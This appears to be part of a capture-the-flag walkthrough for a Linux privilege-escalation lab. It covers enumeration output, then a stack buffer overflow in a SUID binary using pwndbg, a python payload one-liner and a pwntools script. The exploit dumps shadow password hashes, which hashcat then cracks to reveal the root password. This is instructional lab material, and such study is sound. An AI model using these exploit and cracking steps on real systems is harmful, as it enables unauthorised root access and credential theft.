lrwxrwxrwx 1 root root 33 Jan 15  2020 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Jan 15  2020 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Jan 15  2020 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 24 May  9  2018 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 29 May  9  2018 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -> ../dbus.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 28 May  9  2018 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 26 May  9  2018 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Jan 15  2020 console-setup.service -> ../console-setup.service
lrwxrwxrwx 1 root root 20 Jan 15  2020 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Jan 15  2020 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Jan 15  2020 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 25 Jan 15  2020 keyboard-setup.service -> ../keyboard-setup.service
lrwxrwxrwx 1 root root 28 Jan 15  2020 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Jan 15  2020 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 19 Jan 15  2020 setvtrgb.service -> ../setvtrgb.service
lrwxrwxrwx 1 root root 32 Jan 15  2020 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Jan 15  2020 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Jan 15  2020 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Jan 15  2020 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Jan 15  2020 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 30 Jan 15  2020 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 27 Jan 15  2020 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 32 Jan 15  2020 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 36 Jan 15  2020 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Jan 15  2020 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Jan 15  2020 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Jan 15  2020 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Jan 15  2020 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Jan 15  2020 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 24 Jan 15  2020 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 Jan 15  2020 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 30 Jan 15  2020 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 May  9  2018 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 May  9  2018 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Jan 15  2020 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Jan 15  2020 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Jan 15  2020 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Jan 15  2020 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Jan 15  2020 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Jan 15  2020 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -> ../dbus.socket

/lib/systemd/system/systemd-resolved.service.d:
total 4.0K
-rw-r--r-- 1 root root 200 Nov 15  2018 resolvconf.conf

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Nov 15  2018 disable-with-time-daemon.conf

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Jan 15  2020 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/sigpwr.target.wants:
total 0
lrwxrwxrwx 1 root root 36 Jan 15  2020 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/resolvconf.service.wants:
total 0
lrwxrwxrwx 1 root root 42 Jan 15  2020 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Jan 15  2020 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Jan 15  2020 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Nov 15  2018 debian.conf

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-sleep:
total 4.0K
-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm

/lib/systemd/system-generators:
total 692K
-rwxr-xr-x 1 root root  71K Feb 13  2019 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  63K Feb 13  2019 systemd-dbus1-generator
-rwxr-xr-x 1 root root  43K Feb 13  2019 systemd-debug-generator
-rwxr-xr-x 1 root root  83K Feb 13  2019 systemd-fstab-generator
-rwxr-xr-x 1 root root  43K Feb 13  2019 systemd-getty-generator
-rwxr-xr-x 1 root root 123K Feb 13  2019 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  39K Feb 13  2019 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  43K Feb 13  2019 systemd-insserv-generator
-rwxr-xr-x 1 root root  35K Feb 13  2019 systemd-rc-local-generator
-rwxr-xr-x 1 root root  31K Feb 13  2019 systemd-system-update-generator
-rwxr-xr-x 1 root root 103K Feb 13  2019 systemd-sysv-generator
-rwxr-xr-x 1 root root  287 Oct  2  2018 friendly-recovery

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 869 Feb 13  2019 90-systemd.preset

/lib/systemd/network:
total 12K
-rw-r--r-- 1 root root 404 Feb 13  2019 80-container-host0.network
-rw-r--r-- 1 root root 482 Feb 13  2019 80-container-ve.network
-rw-r--r-- 1 root root  80 Feb 13  2019 99-default.link

/lib/systemd/system-shutdown:
total 0


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16


[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using  EditLine wrapper


[+] We can connect to the local MYSQL service with default root/root credentials!
mysqladmin  Ver 8.42 Distrib 5.7.28, for Linux on x86_64
Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Server version		5.7.28-0ubuntu0.16.04.2
Protocol version	10
Connection		Localhost via UNIX socket
UNIX socket		/var/run/mysqld/mysqld.sock
Uptime:			14 min 59 sec

Threads: 1  Questions: 2  Slow queries: 0  Opens: 107  Flush tables: 1  Open tables: 26  Queries per second avg: 0.002


[-] Apache version:
Server version: Apache/2.4.18 (Ubuntu)
Server built:   2019-10-08T13:31:25


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[-] Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 setenvif_module (shared)
 status_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc


[-] Installed compilers:
ii  g++                                 4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler
ii  g++-5                               5.4.0-6ubuntu1~16.04.12                    amd64        GNU C++ compiler
ii  gcc                                 4:5.3.1-1ubuntu1                           amd64        GNU C compiler
ii  gcc-5                               5.4.0-6ubuntu1~16.04.12                    amd64        GNU C compiler
ii  gcc-5-multilib                      5.4.0-6ubuntu1~16.04.12                    amd64        GNU C compiler (multilib support)
ii  gcc-multilib                        4:5.3.1-1ubuntu1                           amd64        GNU C compiler (multilib files)
ii  libllvm6.0:amd64                    1:6.0-1ubuntu2~16.04.1                     amd64        Modular compiler and toolchain technologies, runtime library
ii  libxkbcommon0:amd64                 0.5.0-1ubuntu2.1                           amd64        library interface to the XKB compiler - shared library


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1556 Jan 16  2020 /etc/passwd
-rw-r--r-- 1 root root 825 Jan 15  2020 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 1072 Jan 15  2020 /etc/shadow


[-] SUID files:
-r-sr-xr-x 1 root papa 7516 Jan 16  2020 /opt/secret/root
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount


[-] SGID files:
-rwxr-sr-x 1 root ssh 358624 Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 22768 May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root mlocate 39520 Nov 17  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 62336 May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 27368 May 16  2018 /usr/bin/wall
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /sbin/unix_chkpwd


[+] Files with POSIX capabilities set:
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 338 Nov 17  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 10368 Oct  2  2015 /etc/sensors3.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 3028 Feb 26  2019 /etc/adduser.conf
-rw-r--r-- 1 root root 6488 Jan 15  2020 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 2084 Sep  5  2015 /etc/sysctl.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 350 Jan 15  2020 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 703 May  5  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 280 Jun 19  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 144 Jan 15  2020 /etc/kernel-img.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 14867 Apr 11  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf


[-] Current user's history files:
lrwxrwxrwx 1 pingu pingu    9 Jan 20  2020 /home/pingu/.bash_history -> /dev/null
-rw------- 1 pingu pingu 1852 Jan 20  2020 /home/pingu/.gdb_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/papa/.bash_history
/home/pingu/.bash_history


[-] Location and Permissions (if accessible) of .bak file(s):
-rw-r--r-- 1 root root 3020 Jan 15  2020 /etc/apt/sources.bak
-rw-r----- 1 papa papa 895 Jan 15  2020 /var/backups/shadow.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Feb 26  2019 .
drwxr-xr-x 13 root root 4096 Jan 15  2020 ..


### SCAN COMPLETE ####################################
```

Well now that's a lot of info, got through the result and identify what is the interesting path of the interesting suid file ?

`/opt/secret/root`


## pwndbg

For this section, read the document provided

Luckily for us I was able to snag a copy of the source code from my dad's flash drive

```
#include "unistd.h"
#include "stdio.h"
#include "stdlib.h"
void shell(){
setuid(1000);
setgid(1000);
system("cat /var/backups/shadow.bak");
}

void get_input(){
char buffer[32];
scanf("%s",buffer);
}

int main(){
get_input();
}
```

The SUID file seems to expect 32 characters of input, and then immediately exits. This seems to warrant further investigation. Luckily I was practicing binary exploitation back when I was using that PC, so I have tools preinstalled to examine. One of those tools is pwndbg, a plugin for GDB which allows you to better examine binary files.

Run `gdb /opt/secret/root` and you should see a screen similar to this

```
pingu@ubuntu:~$ gdb /opt/secret/root
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 178 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from /opt/secret/root...(no debugging symbols found)...done.
```

This means that pwndbg has successfully been initialized. The next step is to test if anything happens when you send more then 32 characters. To do this type r < <(cyclic 50), that command runs the program and provides 50 characters worth of "cyclic" input.

Cyclic input goes like this: "aaaaaaaabaaacaaadaaaeaaaf" etc. Because it's in this "cyclic" format, it allows us to better understand the control we have over certain registers, for reasons you are about to see.

Once you run that command you should see something similar to this screen

```
pwndbg> r < <(cyclic 50)
Starting program: /opt/secret/root < <(cyclic 50)
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/pingu/.pwntools-cache-2.7/update to 'never'.
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.0.0)

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────
 EAX  0x1
 EBX  0x0
 ECX  0x1
 EDX  0xf778087c (_IO_stdfile_0_lock) ◂— 0
 EDI  0xf777f000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf777f000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0x6161616b ('kaaa')
 ESP  0xffd72740 ◂— 0xf700616d /* 'ma' */
 EIP  0x6161616c ('laaa')
─────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────
Invalid address 0x6161616c










─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ esp  0xffd72740 ◂— 0xf700616d /* 'ma' */
01:0004│      0xffd72744 —▸ 0xffd72760 ◂— 0x1
02:0008│      0xffd72748 ◂— 0x0
03:000c│      0xffd7274c —▸ 0xf75e5637 (__libc_start_main+247) ◂— add    esp, 0x10
04:0010│      0xffd72750 —▸ 0xf777f000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
... ↓
06:0018│      0xffd72758 ◂— 0x0
07:001c│      0xffd7275c —▸ 0xf75e5637 (__libc_start_main+247) ◂— add    esp, 0x10
───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
 ► f 0 6161616c
   f 1 f700616d
────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address 0x6161616c)
```

Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time.

Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP.

Luckily cyclic provides this functionality with the -l flag, running cyclic -l {fault address} will tell us exactly how many characters we need to provide we can overwrite EIP.

Running `cyclic -l 0x6161616c` outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.

That's all we needed for pre-explotation!

## Binary-Exploitation: Manually

Follow the next document provided:

Previously we figured out that we need to provide 44 characters of input, and then we can execute whatever part of the program we want. Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up.

```
pwndbg> disassemble shell
Dump of assembler code for function shell:
   0x080484cb <+0>:	push   ebp
   0x080484cc <+1>:	mov    ebp,esp
   0x080484ce <+3>:	sub    esp,0x8
   0x080484d1 <+6>:	sub    esp,0xc
   0x080484d4 <+9>:	push   0x3e8
   0x080484d9 <+14>:	call   0x80483a0 <setuid@plt>
   0x080484de <+19>:	add    esp,0x10
   0x080484e1 <+22>:	sub    esp,0xc
   0x080484e4 <+25>:	push   0x3e8
   0x080484e9 <+30>:	call   0x8048370 <setgid@plt>
   0x080484ee <+35>:	add    esp,0x10
   0x080484f1 <+38>:	sub    esp,0xc
   0x080484f4 <+41>:	push   0x80485d0
   0x080484f9 <+46>:	call   0x8048380 <system@plt>
   0x080484fe <+51>:	add    esp,0x10
   0x08048501 <+54>:	nop
   0x08048502 <+55>:	leave  
   0x08048503 <+56>:	ret    
End of assembler dump.
```

What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!

Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408"

We can use python to do this, as it allows a nice way of converting.

Method 1 - Manual conversion:

`python -c 'print "A"*44 + "\xcb\x84\x04\x08"'` will output the payload we want, but it requires manually converting to little endian

Method 2 - Struct:

`python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'`

It requires importing a module but struct.pack allows us to automatically convert memory to little endian.

We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary

`python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root` should provide you with this output.

```
pingu@ubuntu:/opt/secret$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root 
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Segmentation fault
pingu@ubuntu:/opt/secret$ 
```

We did it!

## Binary-Exploitation: The pwntools Way

Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.

We start off the script with:
```
from pwn import *
proc = process('/opt/secret/root')
```

This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.

We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF().

ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.

With the ELF addition our script becomes

```
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
```

shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().

fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our `proc` variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.

With all that our final exploit script becomes

```
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()
```

Save that to a .py file and run it, and you should get this output:

```
pingu@ubuntu:/opt/secret$ mkdir pypy
pingu@ubuntu:/opt/secret$ cd pypy/
pingu@ubuntu:/opt/secret/pypy$ nano sc1.py

=================================================================

pingu@ubuntu:/opt/secret/pypy$ python sc1.py 
[+] Starting local process '/opt/secret/root': pid 1073
[*] '/opt/secret/root'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[*] Switching to interactive mode
[*] Process '/opt/secret/root' stopped with exit code -11 (SIGSEGV) (pid 1073)
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
[*] Got EOF while reading in interactive
```

We did it again!

## Finishing The Job:

Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is "$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.".

Luckily hashcat supports cracking linux password hashes. You can find a list of hashcat modes here and rockyou.txt(a popular wordlist) here (if you don't already have it on your system)

Recommended tool - Hashcat:

Usage: hashcat {flags} {hashfile} {wordlist}

Useful flags:
|Flags|Description|
|--|---|
|-a|Specify attack mode,attack modes can be found in the man page.|
|-m|Specifies which mode to use, refer back to the list of modes|

---
**Answer the questions below**

Q: What is the root password!
A: *love2fish*

**Command:** `$ hashcat -m 1800 -o output.txt admin_pass.hash /usr/share/wordlists/rockyou.txt`

---

































